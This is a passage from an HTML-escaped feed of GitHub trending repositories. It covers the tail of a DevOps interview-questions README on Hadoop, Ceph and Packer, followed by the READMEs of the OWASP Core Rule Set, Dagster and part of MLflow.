&lt;li&gt;Variety: Various forms of data, structured, semi-structured and unstructured&lt;/li&gt; &lt;li&gt;Veracity or Variability: Inconsistent, sometimes inaccurate, varying data &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is DataOps? How is it related to DevOps?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;DataOps seeks to reduce the end-to-end cycle time of data analytics, from the origin of ideas to the literal creation of charts, graphs and models that create value. DataOps combines Agile development, DevOps and statistical process controls and applies them to data analytics. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Data Architecture?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;An answer from &lt;a href=&#34;https://www.talend.com/resources/what-is-data-architecture&#34;&gt;talend.com&lt;/a&gt;:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;Data architecture is the process of standardizing how organizations collect, store, transform, distribute, and use data. The goal is to deliver relevant data to people who need it, when they need it, and help them make sense of it.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the different formats of data&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Structured - data that has defined format and length (e.g. numbers, words)&lt;/li&gt; &lt;li&gt;Semi-structured - Doesn&#39;t conform to a specific format but is self-describing (e.g. XML, SWIFT)&lt;/li&gt; &lt;li&gt;Unstructured - does not follow a specific format (e.g. images, test messages) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Data Warehouse?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Data_warehouse&#34;&gt;Wikipedia&#39;s explanation on Data Warehouse&lt;/a&gt; &lt;a href=&#34;https://aws.amazon.com/data-warehouse&#34;&gt;Amazon&#39;s explanation on Data Warehouse&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Data Lake?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Data_lake&#34;&gt;Data Lake - Wikipedia&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you explain the difference between a data lake and a data warehouse?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &#34;Data Versioning&#34;? What models of &#34;Data Versioning&#34; are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is ETL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Apache Hadoop&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is Hadoop&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Apache_Hadoop&#34;&gt;Apache Hadoop - Wikipedia&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Hadoop YARN&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Responsible for managing the compute resources in clusters and scheduling users&#39; applications &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Hadoop MapReduce&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A programming model for large-scale data processing &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Hadoop Distributed File Systems (HDFS)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Distributed file system providing high aggregate bandwidth across the cluster.&lt;/li&gt; &lt;li&gt;For a user it looks like a regular file system structure but behind the scenes it&#39;s distributed across multiple machines in a cluster&lt;/li&gt; &lt;li&gt;Typical file size is TB and it can scale and supports millions of files&lt;/li&gt; &lt;li&gt;It&#39;s fault tolerant which means it provides automatic recovery from faults&lt;/li&gt; &lt;li&gt;It&#39;s best suited for running long batch operations rather than live analysis &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What do you know about HDFS architecture?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;a href=&#34;http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html&#34;&gt;HDFS Architecture&lt;/a&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Master-slave architecture&lt;/li&gt; &lt;li&gt;Namenode - master, Datanodes - slaves&lt;/li&gt; &lt;li&gt;Files split into blocks&lt;/li&gt; &lt;li&gt;Blocks stored on datanodes&lt;/li&gt; &lt;li&gt;Namenode controls all metadata &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h2&gt;Ceph&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is Ceph&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? Ceph favor consistency and correctness over performances&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; True &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which services or types of storage Ceph supports?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Object (RGW)&lt;/li&gt; &lt;li&gt;Block (RBD)&lt;/li&gt; &lt;li&gt;File (CephFS) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is RADOS?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Reliable Autonomic Distributed Object Storage&lt;/li&gt; &lt;li&gt;Provides low-level data object storage service&lt;/li&gt; &lt;li&gt;Strong Consistency&lt;/li&gt; &lt;li&gt;Simplifies design and implementation of higher layers (block, file, object) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe RADOS software components&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Monitor &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Central authority for authentication, data placement, policy&lt;/li&gt; &#xA;     &lt;li&gt;Coordination point for all other cluster components&lt;/li&gt; &#xA;     &lt;li&gt;Protect critical cluster state with Paxos&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;Manager &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Aggregates real-time metrics (throughput, disk usage, etc.)&lt;/li&gt; &#xA;     &lt;li&gt;Host for pluggable management functions&lt;/li&gt; &#xA;     &lt;li&gt;1 active, 1+ standby per cluster&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;OSD (Object Storage Daemon) &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Stores data on an HDD or SSD&lt;/li&gt; &#xA;     &lt;li&gt;Services client IO requests &lt;/li&gt;&#xA;    &lt;/ul&gt;&lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;    &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the workflow of retrieving data from Ceph?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the workflow of retrieving data from Ceph?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are &#34;Placement Groups&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe in the detail the following: Objects -&amp;gt; Pool -&amp;gt; Placement Groups -&amp;gt; OSDs&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is OMAP?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a metadata server? How it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Packer&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Packer? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;In general, Packer automates machine images creation. It allows you to focus on configuration prior to deployment while making the images. This allows you start the instances much faster in most cases. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Packer follows a &#34;configuration-&amp;gt;deployment&#34; model or &#34;deployment-&amp;gt;configuration&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;A configuration-&amp;gt;deployment which has some advantages like:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;Deployment Speed - you configure once prior to deployment instead of configuring every time you deploy. This allows you to start instances/services much quicker.&lt;/li&gt; &lt;li&gt;More immutable infrastructure - with configuration-&amp;gt;deployment it&#39;s not likely to have very different deployments since most of the configuration is done prior to the deployment. Issues like dependencies errors are handled/discovered prior to deployment in this model. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h2&gt;Certificates&lt;/h2&gt; &#xA;&lt;p&gt;If you are looking for a way to prepare for a certain exam this is the section for you. Here you&#39;ll find a list of certificates, each references to a separate file with focused questions that will help you to prepare to the exam. Good luck :)&lt;/p&gt; &#xA;&lt;h4&gt;AWS&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/certificates/aws-cloud-practitioner.md&#34;&gt;Cloud Practitioner&lt;/a&gt; (Latest update: 2020)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/certificates/aws-solutions-architect-associate.md&#34;&gt;Solutions Architect Associate&lt;/a&gt; (Latest update: 2021)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Azure&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/certificates/azure-fundamentals-az-900.md&#34;&gt;AZ-900&lt;/a&gt; (Latest update: 2021)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Kubernetes&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/certificates/cka.md&#34;&gt;Certified Kubernetes Administrator (CKA)&lt;/a&gt; (Latest update: 2020)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Other DevOps Projects&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://github.com/bregman-arie/howtheydevops&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/how_they_devops.png&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://github.com/bregman-arie/devops-resources&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/devops_resources.png&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://github.com/bregman-arie/infraverse&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/infraverse.png&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;p&gt;Thanks to all of our amazing &lt;a href=&#34;https://github.com/bregman-arie/devops-exercises/graphs/contributors&#34;&gt;contributors&lt;/a&gt; who make it easy for everyone to learn new things :)&lt;/p&gt; &#xA;&lt;p&gt;Logos credits can be found &lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/credits.md&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://creativecommons.org/licenses/by-nc-nd/3.0/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-CC%20BY--NC--ND%203.0-lightgrey.svg?sanitize=true&#34; alt=&#34;License: CC BY-NC-ND 3.0&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>coreruleset/coreruleset</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/coreruleset/coreruleset</id>
    <link href="https://github.com/coreruleset/coreruleset" rel="alternate"></link>
    <summary type="html">&lt;p&gt;OWASP ModSecurity Core Rule Set (Official Repository)&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/coreruleset/coreruleset/workflows/Regression%20Tests/badge.svg?branch=v3.4%2Fdev&#34; alt=&#34;GHA build v3.4/dev&#34;&gt; &lt;img src=&#34;https://github.com/coreruleset/coreruleset/workflows/Regression%20Tests/badge.svg?branch=v3.3%2Fdev&#34; alt=&#34;GHA build v3.3/dev&#34;&gt; &lt;img src=&#34;https://github.com/coreruleset/coreruleset/workflows/Regression%20Tests/badge.svg?branch=v3.2%2Fdev&#34; alt=&#34;GHA build v3.2/dev&#34;&gt; &lt;a href=&#34;https://owasp.org/projects/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/owasp-flagship%20project-38a047.svg?sanitize=true&#34; alt=&#34;OWASP Flagship&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://bestpractices.coreinfrastructure.org/projects/1390&#34;&gt;&lt;img src=&#34;https://bestpractices.coreinfrastructure.org/projects/1390/badge&#34; alt=&#34;CII Best Practices&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opensource.org/licenses/Apache-2.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache%202.0-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;OWASP ModSecurity Core Rule Set (CRS)&lt;/h1&gt; &#xA;&lt;p&gt;The OWASP ModSecurity Core Rule Set (CRS) is a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls. The CRS aims to protect web applications from a wide range of attacks, including the OWASP Top Ten, with a minimum of false alerts.&lt;/p&gt; &#xA;&lt;h2&gt;CRS Resources&lt;/h2&gt; &#xA;&lt;p&gt;Please see the &lt;a href=&#34;https://coreruleset.org/&#34;&gt;OWASP ModSecurity Core Rule Set page&lt;/a&gt; to get introduced to the CRS and view resources on installation, configuration, and working with the CRS.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing to the CRS&lt;/h2&gt; &#xA;&lt;p&gt;We strive to make the OWASP ModSecurity CRS accessible to a wide audience of beginner and experienced users. We are interested in hearing any bug reports, false-positive alert reports, evasions, usability issues, and suggestions for new detections.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/coreruleset/coreruleset/issues&#34;&gt;Create an issue on GitHub&lt;/a&gt; to report a false positive or false negative (evasion). Please include your installed version and the relevant portions of your ModSecurity audit log. We will try and address your issue and potentially ask for additional information to reproduce your problem. Please also note that stale issues will be flagged and closed after 120 days. You can search for stale issues with the following &lt;a href=&#34;https://github.com/coreruleset/coreruleset/issues?q=label%3A%22Stale+issue%22&#34;&gt;search query&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://groups.google.com/a/owasp.org/forum/#!forum/modsecurity-core-rule-set-project&#34;&gt;Sign up for our Google Group&lt;/a&gt; to ask general usage questions and participate in discussions on the CRS. Also &lt;a href=&#34;https://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/index&#34;&gt;here&lt;/a&gt; you can find the archives for the previous mailing list.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://owasp.slack.com/&#34;&gt;Join the #coreruleset channel on OWASP Slack&lt;/a&gt; to chat about the CRS. (&lt;a href=&#34;https://owasp-slack.herokuapp.com/&#34;&gt;Click here&lt;/a&gt; to get an invitation if you are not yet registered on the OWASP slack. It&#39;s open to non-members too.)&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Copyright (c) 2006-2020 Trustwave and contributors. All rights reserved. Copyright (c) 2021-2022 Core Rule Set project. All rights reserved.&lt;/p&gt; &#xA;&lt;p&gt;The OWASP ModSecurity Core Rule Set is distributed under Apache Software License (ASL) version 2. Please see the enclosed LICENSE file for full details.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dagster-io/dagster</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/dagster-io/dagster</id>
    <link href="https://github.com/dagster-io/dagster" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An orchestration platform for the development, production, and observation of data assets.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://dagster.io/&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dagster-io/dagster/master/assets/dagster-logo.png&#34;&gt;&lt;/a&gt; &lt;br&gt;&lt;br&gt; &lt;a href=&#34;https://twitter.com/dagsterio&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/dagsterio&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://dagster.io/slack&#34;&gt;&lt;img src=&#34;https://dagster-slackin.herokuapp.com/badge.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/dagster-io/dagster&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/stars/dagster-io/dagster?label=Star&amp;amp;style=social&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h1&gt;&lt;a href=&#34;https://dagster.io/&#34;&gt;Dagster&lt;/a&gt; · &lt;a href=&#34;https://github.com/dagster-io/dagster/raw/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache_2.0-blue.svg?sanitize=true&#34; alt=&#34;GitHub license&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/dagster/&#34;&gt;&lt;img src=&#34;https://badge.fury.io/py/dagster.svg?sanitize=true&#34; alt=&#34;PyPI Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://coveralls.io/github/dagster-io/dagster?branch=master&#34;&gt;&lt;img src=&#34;https://coveralls.io/repos/github/dagster-io/dagster/badge.svg?branch=master&#34; alt=&#34;Coveralls coverage&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;Dagster is an orchestration platform for the development, production, and observation of data assets.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Develop and test locally, then deploy anywhere:&lt;/strong&gt; With Dagster, the same computations can run in-process against your local file system or on a distributed work queue against your production data lake. Choose to locally develop on your laptop, deploy on-premise, or run in any cloud.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Model the data produced and consumed:&lt;/strong&gt; In your orchestration graph, Dagster models data dependencies and handles how data passes between steps. Gradual typing on inputs and outputs catches bugs early.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Link data to computations:&lt;/strong&gt; Dagster’s Asset Catalog tracks the data sets and ML models produced by your jobs. Understand how they were generated and trace issues when asset declarations do not match their materializations in storage.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Build a self-service data platform:&lt;/strong&gt; Dagster helps platform teams build systems for data practitioners. Jobs are built from shared, reusable, configurable data processing components. Dagit, Dagster’s web interface, lets anyone inspect these objects and discover how to use them.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Declare and isolate dependencies:&lt;/strong&gt; Dagster’s server model enables you to isolate codebases. Problems in one job will not bring down the system or other jobs. Each job can have its own package dependencies and Python version.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Debug jobs from a rich interface&lt;/strong&gt;: Dagit includes expansive facilities for understanding the jobs it orchestrates. When inspecting a run of your job, you can query over logs, discover the most time-consuming tasks via a Gantt chart, re-execute subsets of steps, and more.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;Dagster is available on PyPI and officially supports Python 3.6+.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ pip install dagster dagit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This installs two modules:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Dagster&lt;/strong&gt;: The core programming model.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Dagit&lt;/strong&gt;: The web interface for developing and operating Dagster jobs. It includes a DAG browser, a type-aware interface to launch runs, a live view for in-progress runs, a catalog to view your data assets, and more.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For a quick overview, check out our &lt;a href=&#34;https://docs.dagster.io/getting-started&#34;&gt;Getting Started&lt;/a&gt; page.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;You can find the Dagster documentation &lt;a href=&#34;https://docs.dagster.io&#34;&gt;on the website&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;We&#39;ve divided up the documentation into several sections:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.dagster.io/tutorial/&#34;&gt;🌱 Tutorial&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.dagster.io/concepts&#34;&gt;💡 Concepts&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.dagster.io/deployment&#34;&gt;🚢 Deployment&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.dagster.io/integrations&#34;&gt;🤝 Integrations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.dagster.io/guides&#34;&gt;📖 Guides&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;Connect with thousands of other data practitioners building with Dagster. Share knowledge, get help, and contribute to the open-source project. To see featured material and upcoming events, check out our &lt;a href=&#34;https://dagster.io/community&#34;&gt;Dagster Community&lt;/a&gt; page.&lt;/p&gt; &#xA;&lt;p&gt;Join our community here:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;🌟 &lt;a href=&#34;https://github.com/dagster-io/dagster&#34;&gt;Star us on Github&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;🐦 &lt;a href=&#34;https://twitter.com/dagsterio&#34;&gt;Follow us on Twitter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;📺 &lt;a href=&#34;https://www.youtube.com/channel/UCfLnv9X8jyHTe6gJ4hVBo9Q&#34;&gt;Subscribe to our YouTube Channel&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;📚 &lt;a href=&#34;https://dagster.io/blog&#34;&gt;Read our Blog Posts&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;👋 &lt;a href=&#34;https://dagster.io/slack&#34;&gt;Join us on Slack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;✏️ &lt;a href=&#34;https://github.com/dagster-io/dagster/discussions&#34;&gt;Start a Github Discussion&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;For details on contributing or running the project for development, check out our &lt;a href=&#34;https://docs.dagster.io/community/contributing/&#34;&gt;contributing guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Dagster is &lt;a href=&#34;https://github.com/dagster-io/dagster/raw/master/LICENSE&#34;&gt;Apache 2.0 licensed&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>mlflow/mlflow</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/mlflow/mlflow</id>
    <link href="https://github.com/mlflow/mlflow" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Open source platform for the machine learning lifecycle&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;============================================= MLflow: A Machine Learning Lifecycle Platform&lt;/h1&gt; &#xA;&lt;p&gt;MLflow is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models. MLflow offers a set of lightweight APIs that can be used with any existing machine learning application or library (TensorFlow, PyTorch, XGBoost, etc), wherever you currently run ML code (e.g. in notebooks, standalone applications or the cloud). MLflow&#39;s current components are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;MLflow Tracking &amp;lt;https://mlflow.org/docs/latest/tracking.html&amp;gt;&lt;/code&gt;_: An API to log parameters, code, and results in machine learning experiments and compare them using an interactive UI.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;MLflow Projects &amp;lt;https://mlflow.org/docs/latest/projects.html&amp;gt;&lt;/code&gt;_: A code packaging format for reproducible runs using Conda and Docker, so you can share your ML code with others.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;MLflow Models &amp;lt;https://mlflow.org/docs/latest/models.html&amp;gt;&lt;/code&gt;_: A model packaging format and tools that let you easily deploy the same model (from any ML library) to batch and real-time scoring on platforms such as Docker, Apache Spark, Azure ML and AWS SageMaker.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;MLflow Model Registry &amp;lt;https://mlflow.org/docs/latest/model-registry.html&amp;gt;&lt;/code&gt;_: A centralized model store, set of APIs, and UI, to collaboratively manage the full lifecycle of MLflow Models.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;|docs| |labeling| |examples| |cross-version-tests| |r-devel| |pypi| |conda-forge| |cran| |maven| |license| |downloads| |slack| |twitter|&lt;/p&gt; &#xA;&lt;p&gt;.. |docs| image:: &lt;a href=&#34;https://img.shields.io/badge/docs-latest-success.svg?style=for-the-badge&#34;&gt;https://img.shields.io/badge/docs-latest-success.svg?style=for-the-badge&lt;/a&gt; :target: &lt;a href=&#34;https://mlflow.org/docs/latest/index.html&#34;&gt;https://mlflow.org/docs/latest/index.html&lt;/a&gt; :alt: Latest Docs .. |labeling| image:: &lt;a 